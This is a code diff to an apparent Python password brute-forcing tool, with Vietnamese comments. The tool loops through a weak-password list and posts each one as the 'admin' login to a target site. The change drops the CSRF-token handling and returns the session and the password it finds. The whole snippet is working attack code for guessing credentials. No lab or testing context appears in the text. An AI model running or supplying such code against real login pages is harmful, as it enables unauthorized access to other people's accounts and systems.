@@ -28,21 +28,20 @@ def brute_force_pass_site(api_url: str, path_weak_pass: str) -> tuple[requests.S
     # truy cập vào ip và lặp các mật khẩu để đăng nhaap
     for password in weak_passwords:
         session = requests.Session()
-        try:
-            response = session.get(api_url, timeout=3)
-        except requests.RequestException as e:
-            return None, None
-        # response = session.get(api_url)
-        csrf_token = get_csrf_token(response)
+        # try:
+        #     response = session.get(api_url, timeout=3)
+        # except requests.RequestException as e:
+        #     return None, None
+        # csrf_token = get_csrf_token(response)
         data = {
-            "csrf": csrf_token,
+            "username": "admin",
             "password": password
         }
         response = session.post(api_url, data=data)
         if response.status_code == 200:
             print(f"[+] Found valid password: {password}")
-            csrf_token = get_csrf_token(response)
-            return session, csrf_token
+            # csrf_token = get_csrf_token(response)
+            return session, password
         else:
             print(f"[-] Invalid password: {password}")
 
